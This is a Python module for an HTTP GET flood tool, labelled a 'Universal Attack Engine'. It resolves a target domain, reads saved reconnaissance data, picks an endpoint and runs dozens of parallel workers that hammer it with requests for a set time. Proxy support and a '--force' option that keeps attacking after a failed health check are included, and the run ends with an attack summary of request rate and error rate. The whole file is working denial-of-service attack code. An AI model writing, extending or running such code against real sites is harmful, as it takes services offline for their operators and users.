import asyncio
import logging
import urllib.parse
from typing import List, Optional, Dict, Any

from src.core.infrastructure.universal_benchmark import UniversalBenchmark
from src.core.infrastructure.fixed_metrics import FixedMetrics
from src.core.infrastructure.parallel_worker import parallel_worker
from src.core.analysis.universal_adapter import UniversalTargetAdapter
from src.utils.dns_resolver import pre_resolve_domain

class HTTPGetFlood:
    """
    UNIVERSAL ATTACK ENGINE v3.1.
    High-performance, fire-and-forget, and metrics-integrated.
    """
    def __init__(self, target_url: str, proxies: Optional[List[str]] = None, headers: Optional[dict] = None, adaptive_ctrl=None, shared_metrics=None):
        if not target_url.startswith("http"):
            target_url = f"https://{target_url}"
        self.original_target = target_url
        self.domain = urllib.parse.urlparse(target_url).netloc
        self.proxies = proxies
        self.logger = logging.getLogger("HTTPGetFlood")
        self.adaptive_ctrl = adaptive_ctrl
        self.metrics = shared_metrics or FixedMetrics()
        self._stop_event = asyncio.Event()
        self.resolved_ip = None

    async def start(self, duration: int, threads: int = 50, force: bool = False, diagnose: bool = False):
        self.logger.info(f"[*] Initializing Universal Attack Engine v3.1 for {self.domain}")
        
        # 1. DNS Resolution with Consistency Check
        try:
            res = pre_resolve_domain(self.domain)
            self.resolved_ip = res["ip"]
            
            if diagnose:
                self.logger.info(f"[DIAGNOSE] DNS Resolved: {self.domain} -> {self.resolved_ip}")
                self.logger.info(f"[DIAGNOSE] All IPs found: {res.get('all_ips', [])}")
                if not res.get("reachable"):
                    self.logger.warning(f"[DIAGNOSE] IP {self.resolved_ip} is NOT reachable via TCP 443: {res.get('reach_error')}")
        except Exception as e:
            self.logger.error(f"[-] DNS Resolution failed: {e}")
            return

        # 2. CMS Adaptation
        recon_data = {}
        import json
        import os
        recon_path = f"output/reports/recon_{self.domain}.json"
        if os.path.exists(recon_path):
            try:
                with open(recon_path, 'r') as f:
                    recon_data = json.load(f)
            except: pass

        adapter = UniversalTargetAdapter(self.domain, recon_data)
        endpoints = adapter.discover_endpoints()
        if not endpoints:
            self.logger.error("[-] No valid endpoints found for target.")
            return
            
        target_ep = endpoints[0]
        attack_path = urllib.parse.urlparse(target_ep["url"]).path
        attack_query = urllib.parse.urlparse(target_ep["url"]).query
        
        # 3. Execution
        async with UniversalBenchmark(self.domain, self.resolved_ip, threads) as engine:
            
            # 4. Robust Health Check
            health = await engine.health_check()
            if not health["ok"]:
                self.logger.warning(f"[-] Health check FAILED: {health.get('error')}")
                if not force:
                    self.logger.critical("[!] Aborting attack. Use --force to attack anyway.")
                    return
                self.logger.warning("[!] --force enabled. Continuing attack despite health check failure.")
            else:
                self.logger.info(f"[+] Health check OK: HTTP {health['status']} via {health.get('method')} in {health['latency_ms']:.0f}ms")
            
            # 5. Benchmark
            try:
                bench = await engine.benchmark(duration=2)
                self.logger.info(f"[BENCHMARK] Throughput: {bench['rps']:.1f} RPS")
            except Exception as e:
                self.logger.debug(f"Benchmark skipped: {e}")

            # 6. Launch Workers
            attack_url = f"https://{self.domain}{attack_path}"
            if attack_query:
                attack_url += f"?{attack_query}"
            
            self.logger.info(f"[*] Launching {threads} parallel workers on: {attack_url}")
            
            workers = [
                asyncio.create_task(
                    parallel_worker(
                        engine.session, 
                        attack_url, 
                        self.domain, 
                        self.metrics, 
                        self._stop_event, 
                        self.adaptive_ctrl
                    )
                )
                for _ in range(threads)
            ]
            
            try:
                await asyncio.wait_for(self._stop_event.wait(), timeout=duration)
            except asyncio.TimeoutError:
                pass
            finally:
                self.stop()
                await asyncio.gather(*workers, return_exceptions=True)
                
                # 7. Final Summary
                summary = self.metrics.get_summary()
                self.logger.info("\n" + "="*50)
                self.logger.info(f"UNIVERSAL ATTACK SUMMARY — {self.domain}")
                self.logger.info(f"Attempted: {summary['attempted']}")
                self.logger.info(f"Completed: {summary['completed']} | Failed: {summary['failed']}")
                self.logger.info(f"Error Rate: {summary['error_rate']*100:.1f}% | RPS: {summary['rps']}")
                self.logger.info("="*50)

    def stop(self):
        self._stop_event.set()
